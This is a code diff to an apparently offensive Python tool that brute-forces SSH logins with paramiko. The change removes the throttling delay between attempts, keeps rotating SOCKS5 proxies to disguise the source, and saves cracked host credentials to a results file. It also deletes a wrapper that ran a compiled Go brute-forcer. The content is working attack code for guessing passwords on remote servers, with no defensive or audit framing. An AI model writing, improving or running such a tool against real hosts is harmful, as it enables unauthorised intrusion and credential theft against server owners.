@@ -8,7 +8,7 @@ import socket
 from itertools import cycle
 from tqdm import tqdm
 from termcolor import colored
-from concurrent.futures import ThreadPoolExecutor
+from concurrent.futures import ThreadPoolExecutor, as_completed
 import paramiko
 
 # Load wordlists for SSH Bruteforce
@@ -44,8 +44,8 @@ def load_wordlists():
     return usernames, passwords
 
 
-# Perform SSH Bruteforce using Python (Paramiko)
-def python_bruteforce_ssh(targets, usernames, passwords, max_threads=5):
+# Perform SSH Bruteforce
+def bruteforce_ssh(targets, usernames, passwords, max_threads=5):
     """
     Perform SSH brute force attack using Paramiko.
 
@@ -54,11 +54,12 @@ def python_bruteforce_ssh(targets, usernames, passwords, max_threads=5):
     :param passwords: List of passwords to test
     :param max_threads: Maximum number of concurrent threads
     """
-    results_file = "results/cracked_python.txt"
+    results_file = "results/cracked.txt"
     os.makedirs("results", exist_ok=True)
 
-    print("[INFO] Starting Python-based brute force attack...")
-    proxy_cycle = cycle(global_tested_proxies) if global_config["proxy_usage"] else None
+    print("[INFO] Starting brute force attack...")
+
+    proxy_cycle = cycle(global_tested_proxies) if global_config.get("proxy_usage", False) else None
 
     def attempt_login(host, username, password, proxy=None):
         """
@@ -68,8 +69,8 @@ def python_bruteforce_ssh(targets, usernames, passwords, max_threads=5):
         :param username: SSH username
         :param password: SSH password
         :param proxy: Optional SOCKS5 proxy
+        :return: None
         """
-        # Check if scan is paused or stopped
         while pause_event.is_set():
             time.sleep(0.5)
 
@@ -78,33 +79,30 @@ def python_bruteforce_ssh(targets, usernames, passwords, max_threads=5):
             return
 
         try:
-            # Set up SSH client
             client = paramiko.SSHClient()
             client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
             # Apply proxy settings if enabled
             if proxy:
-                proxy_host, proxy_port = proxy.split(":")
+                proxy_host, proxy_port = proxy
                 socks.setdefaultproxy(socks.SOCKS5, proxy_host, int(proxy_port))
                 socket.socket = socks.socksocket
 
             # Connect using username/password
-            client.connect(host, username=username, password=password, timeout=global_config["scan_timeout"])
+            client.connect(host, username=username, password=password, timeout=global_config.get("scan_timeout", 5))
+
             print(colored(f"[SUCCESS] {host} - {username}:{password}", "green"))
 
-            # Save successful credentials
             with open(results_file, "a") as file:
                 file.write(f"{host} {username}:{password}\n")
 
             client.close()
 
         except paramiko.AuthenticationException:
-            pass  # Ignore failed attempts
+            pass  # Ignore failed login attempts
+
         except Exception as e:
             print(colored(f"[ERROR] {host} - {username}:{password}: {e}", "red"))
-
-        # Introduce random delay
-        time.sleep(0.5)
 
     # Start multithreaded bruteforcing
     with ThreadPoolExecutor(max_threads) as executor:
@@ -113,31 +111,11 @@ def python_bruteforce_ssh(targets, usernames, passwords, max_threads=5):
             proxy = next(proxy_cycle) if proxy_cycle else None
             for username in usernames:
                 for password in passwords:
-                    futures.append(executor.submit(attempt_login, target, username, password, proxy))
+                    futures.append(
+                        executor.submit(attempt_login, target, username, password, proxy)
+                    )
 
-        for future in tqdm(futures, desc="Bruteforcing SSH", total=len(futures)):
+        for future in tqdm(as_completed(futures), desc="Bruteforcing SSH", total=len(futures)):
             future.result()  # Ensure exceptions are caught
 
     print(f"[INFO] Brute force complete. Results saved to {results_file}.")
-
-
-# Perform SSH Bruteforce using Golang binary
-def golang_bruteforce_ssh():
-    """
-    Perform SSH brute force attack using the Golang method.
-
-    This function calls the compiled Golang binary (golang_brute).
-    """
-    print("[INFO] Starting Golang SSH Bruteforce...")
-
-    if not os.path.exists("golang_brute"):
-        print("[ERROR] Golang binary not found. Compile it first using:")
-        print("       go build -o golang_brute golang_brute.go")
-        return
-
-    try:
-        subprocess.run(["./golang_brute"], check=True)
-    except FileNotFoundError:
-        print("[ERROR] Golang binary not found.")
-    except subprocess.CalledProcessError:
-        print("[ERROR] Golang bruteforce failed.")
